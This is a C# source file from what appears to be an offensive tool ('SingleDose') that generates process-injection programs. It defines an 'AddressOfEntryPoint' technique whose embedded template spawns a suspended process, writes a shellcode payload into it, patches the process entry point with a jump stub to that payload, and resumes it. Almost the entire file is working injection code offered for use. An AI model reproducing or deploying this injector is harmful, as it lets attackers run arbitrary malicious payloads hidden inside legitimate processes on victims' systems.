using System.Collections.Generic;

namespace SingleDose.Techniques.Injects
{
    internal class AddressOfEntryPoint : ITechnique
    {
        string ITechnique.TechniqueName => "AddressOfEntryPoint";

        string ITechnique.TechniqueDescription => "This technique calculates the entry point of a suspended process. Once resumed, the " +
            "process jumps to the address of your shellcode.";

        List<string> ITechnique.TechniqueReferences => new List<string>() 
        {
            @"https://www.ired.team/offensive-security/code-injection-process-injection/addressofentrypoint-code-injection-without-virtualallocex-rwx"
        };

        bool ITechnique.IsUnsafe => true;

        bool ITechnique.IsLoader => false;
        List<string> ITechnique.Invokes => new List<string>() { "VirtualAllocEx", "CreateProcess", "NtQueryInformationProcess", "ReadProcessMemory", "WriteProcessMemory_ByteArray", "ResumeThread" };
        List<string> ITechnique.Prerequisites => new List<string>() { "SpawnProcess" };
        string ITechnique.Base => @"
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;

namespace {{NAMESPACE}}
{
    class Program
    {
        static void Main(string[] args)
        {
            {{MODE}}
            {{TRIGGER}}
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION sPI = new PROCESS_INFORMATION();
            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
            CreateProcess({{SPAWNPROCESS}}, null, IntPtr.Zero, IntPtr.Zero, false, 0x00000004, IntPtr.Zero, null, ref si, out sPI);

            int returnLength;
            NtQueryInformationProcess(sPI.hProcess, 0 /*ProcessBasicInformation*/, out pbi, Marshal.SizeOf(pbi), out returnLength);

            IntPtr pebOffset = (IntPtr)(pbi.PebBaseAddress.ToInt64() + 16);
            byte[] imageBase = new byte[IntPtr.Size];

            IntPtr numBytesRead;
            ReadProcessMemory(sPI.hProcess, pebOffset, imageBase, imageBase.Length, out numBytesRead);

            byte[] headersBuffer = new byte[4096];
            IntPtr pImageBase = (IntPtr)(BitConverter.ToInt64(imageBase, 0));
            ReadProcessMemory(sPI.hProcess, pImageBase, headersBuffer, 4096, out numBytesRead);

            GCHandle pHeader = GCHandle.Alloc(headersBuffer, GCHandleType.Pinned);
            IMAGE_DOS_HEADER dosHeader = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(pHeader.AddrOfPinnedObject(), typeof(IMAGE_DOS_HEADER));

            IntPtr pNtHeader = (IntPtr)(pHeader.AddrOfPinnedObject().ToInt64() + dosHeader.e_lfanew);
            IMAGE_NT_HEADERS64 ntHeader = (IMAGE_NT_HEADERS64)Marshal.PtrToStructure(pNtHeader, typeof(IMAGE_NT_HEADERS64));

            uint Commit = 0x1000;
            uint Reserve = 0x2000;
            IntPtr numBytesWritten;

            IntPtr hAlloc = VirtualAllocEx(sPI.hProcess, IntPtr.Zero, (uint)payload.Length, Commit | Reserve, {{flProtect}});
            bool bvRet = WriteProcessMemory(sPI.hProcess, hAlloc, payload, (uint)payload.Length, out numBytesWritten);
            if (!bvRet)
            {
                Console.WriteLine(""[!] WriteProcessMemory: {0}"", Marshal.GetLastWin32Error().ToString());
                Process.GetProcessById(sPI.dwProcessId).Kill(); //Kill the suspended process.
                Environment.Exit(1);
            }

            byte[] mov_rax = new byte[2] { 0x48, 0xb8 };
            byte[] jmp_address = BitConverter.GetBytes(hAlloc.ToInt64());
            byte[] jmp_rax = new byte[2] { 0xff, 0xe0 };
            byte[] full = new byte[mov_rax.Length + jmp_address.Length + jmp_rax.Length];
            mov_rax.CopyTo(full, 0);
            jmp_address.CopyTo(full, mov_rax.Length);
            jmp_rax.CopyTo(full, mov_rax.Length + jmp_address.Length);

            IntPtr codeEntry = ((IntPtr)(ntHeader.OptionalHeader.AddressOfEntryPoint + pImageBase.ToInt64()));
            bvRet = WriteProcessMemory(sPI.hProcess, codeEntry, full, (uint)full.Length, out numBytesWritten);
            if (!bvRet)
            {
                Console.WriteLine(""[!] WriteProcessMemory: {0}"", Marshal.GetLastWin32Error().ToString());
                Process.GetProcessById(sPI.dwProcessId).Kill(); //Kill the suspended process.
                Environment.Exit(1);
            }
            {{PROTECT}}
            ResumeThread(sPI.hThread);
        }

        {{ARGS}}

        #region PE_StructsAndEnums
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        private struct PROCESS_BASIC_INFORMATION
        {
            //public NtStatus ExitStatus;
            public uint ExitStatus;
            public IntPtr PebBaseAddress;
            public UIntPtr AffinityMask;
            public int BasePriority;
            public UIntPtr UniqueProcessId;
            public UIntPtr InheritedFromUniqueProcessId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SecurityAttributes
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DOS_HEADER
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
            public char[] e_magic;       // Magic number
            public UInt16 e_cblp;    // Bytes on last page of file
            public UInt16 e_cp;      // Pages in file
            public UInt16 e_crlc;    // Relocations
            public UInt16 e_cparhdr;     // Size of header in paragraphs
            public UInt16 e_minalloc;    // Minimum extra paragraphs needed
            public UInt16 e_maxalloc;    // Maximum extra paragraphs needed
            public UInt16 e_ss;      // Initial (relative) SS value
            public UInt16 e_sp;      // Initial SP value
            public UInt16 e_csum;    // Checksum
            public UInt16 e_ip;      // Initial IP value
            public UInt16 e_cs;      // Initial (relative) CS value
            public UInt16 e_lfarlc;      // File address of relocation table
            public UInt16 e_ovno;    // Overlay number
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
            public UInt16[] e_res1;    // Reserved words
            public UInt16 e_oemid;       // OEM identifier (for e_oeminfo)
            public UInt16 e_oeminfo;     // OEM information; e_oemid specific
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
            public UInt16[] e_res2;    // Reserved words
            public Int32 e_lfanew;      // File address of new exe header

            private string _e_magic
            {
                get { return new string(e_magic); }
            }

            public bool isValid
            {
                get { return _e_magic == ""MZ""; }
            }
        }

        [StructLayout(LayoutKind.Explicit)]
        unsafe public struct IMAGE_NT_HEADERS64
        {
            [FieldOffset(0)]
            public UInt32 Signature;

            [FieldOffset(4)]
            public IMAGE_FILE_HEADER FileHeader;

            [FieldOffset(24)]
            public IMAGE_OPTIONAL_HEADER64 OptionalHeader;

            private string _Signature
            {
                get { return new string((char*)Signature); }
            }

            public bool isValid
            {
                get { return _Signature == ""PE\0\0"" && OptionalHeader.Magic == MagicType.IMAGE_NT_OPTIONAL_HDR64_MAGIC; }
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_FILE_HEADER
        {
            public UInt16 Machine;
            public UInt16 NumberOfSections;
            public UInt32 TimeDateStamp;
            public UInt32 PointerToSymbolTable;
            public UInt32 NumberOfSymbols;
            public UInt16 SizeOfOptionalHeader;
            public UInt16 Characteristics;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_OPTIONAL_HEADER64
        {
            [FieldOffset(0)]
            public MagicType Magic;

            [FieldOffset(2)]
            public byte MajorLinkerVersion;

            [FieldOffset(3)]
            public byte MinorLinkerVersion;

            [FieldOffset(4)]
            public uint SizeOfCode;

            [FieldOffset(8)]
            public uint SizeOfInitializedData;

            [FieldOffset(12)]
            public uint SizeOfUninitializedData;

            [FieldOffset(16)]
            public uint AddressOfEntryPoint;

            [FieldOffset(20)]
            public uint BaseOfCode;

            [FieldOffset(24)]
            public ulong ImageBase;

            [FieldOffset(32)]
            public uint SectionAlignment;

            [FieldOffset(36)]
            public uint FileAlignment;

            [FieldOffset(40)]
            public ushort MajorOperatingSystemVersion;

            [FieldOffset(42)]
            public ushort MinorOperatingSystemVersion;

            [FieldOffset(44)]
            public ushort MajorImageVersion;

            [FieldOffset(46)]
            public ushort MinorImageVersion;

            [FieldOffset(48)]
            public ushort MajorSubsystemVersion;

            [FieldOffset(50)]
            public ushort MinorSubsystemVersion;

            [FieldOffset(52)]
            public uint Win32VersionValue;

            [FieldOffset(56)]
            public uint SizeOfImage;

            [FieldOffset(60)]
            public uint SizeOfHeaders;

            [FieldOffset(64)]
            public uint CheckSum;

            [FieldOffset(68)]
            public SubSystemType Subsystem;

            [FieldOffset(70)]
            public DllCharacteristicsType DllCharacteristics;

            [FieldOffset(72)]
            public ulong SizeOfStackReserve;

            [FieldOffset(80)]
            public ulong SizeOfStackCommit;

            [FieldOffset(88)]
            public ulong SizeOfHeapReserve;

            [FieldOffset(96)]
            public ulong SizeOfHeapCommit;

            [FieldOffset(104)]
            public uint LoaderFlags;

            [FieldOffset(108)]
            public uint NumberOfRvaAndSizes;

            [FieldOffset(112)]
            public IMAGE_DATA_DIRECTORY ExportTable;

            [FieldOffset(120)]
            public IMAGE_DATA_DIRECTORY ImportTable;

            [FieldOffset(128)]
            public IMAGE_DATA_DIRECTORY ResourceTable;

            [FieldOffset(136)]
            public IMAGE_DATA_DIRECTORY ExceptionTable;

            [FieldOffset(144)]
            public IMAGE_DATA_DIRECTORY CertificateTable;

            [FieldOffset(152)]
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;

            [FieldOffset(160)]
            public IMAGE_DATA_DIRECTORY Debug;

            [FieldOffset(168)]
            public IMAGE_DATA_DIRECTORY Architecture;

            [FieldOffset(176)]
            public IMAGE_DATA_DIRECTORY GlobalPtr;

            [FieldOffset(184)]
            public IMAGE_DATA_DIRECTORY TLSTable;

            [FieldOffset(192)]
            public IMAGE_DATA_DIRECTORY LoadConfigTable;

            [FieldOffset(200)]
            public IMAGE_DATA_DIRECTORY BoundImport;

            [FieldOffset(208)]
            public IMAGE_DATA_DIRECTORY IAT;

            [FieldOffset(216)]
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;

            [FieldOffset(224)]
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;

            [FieldOffset(232)]
            public IMAGE_DATA_DIRECTORY Reserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DATA_DIRECTORY
        {
            public UInt32 VirtualAddress;
            public UInt32 Size;
        }

        public enum DllCharacteristicsType : ushort
        {
            RES_0 = 0x0001,
            RES_1 = 0x0002,
            RES_2 = 0x0004,
            RES_3 = 0x0008,
            IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE = 0x0040,
            IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY = 0x0080,
            IMAGE_DLL_CHARACTERISTICS_NX_COMPAT = 0x0100,
            IMAGE_DLLCHARACTERISTICS_NO_ISOLATION = 0x0200,
            IMAGE_DLLCHARACTERISTICS_NO_SEH = 0x0400,
            IMAGE_DLLCHARACTERISTICS_NO_BIND = 0x0800,
            RES_4 = 0x1000,
            IMAGE_DLLCHARACTERISTICS_WDM_DRIVER = 0x2000,
            IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE = 0x8000
        }

        public enum SubSystemType : ushort
        {
            IMAGE_SUBSYSTEM_UNKNOWN = 0,
            IMAGE_SUBSYSTEM_NATIVE = 1,
            IMAGE_SUBSYSTEM_WINDOWS_GUI = 2,
            IMAGE_SUBSYSTEM_WINDOWS_CUI = 3,
            IMAGE_SUBSYSTEM_POSIX_CUI = 7,
            IMAGE_SUBSYSTEM_WINDOWS_CE_GUI = 9,
            IMAGE_SUBSYSTEM_EFI_APPLICATION = 10,
            IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER = 11,
            IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER = 12,
            IMAGE_SUBSYSTEM_EFI_ROM = 13,
            IMAGE_SUBSYSTEM_XBOX = 14

        }

        public enum MagicType : ushort
        {
            IMAGE_NT_OPTIONAL_HDR32_MAGIC = 0x10b,
            IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x20b
        }
        #endregion PE_StructsAndEnumsForDays

        {{INVOKE}}
    }
}";

        string ITechnique.VProtect => @"uint oldProtect;
            VirtualProtectEx(sPI.hProcess, hAlloc, payload.Length, 0x20, out oldProtect);";
    }
}
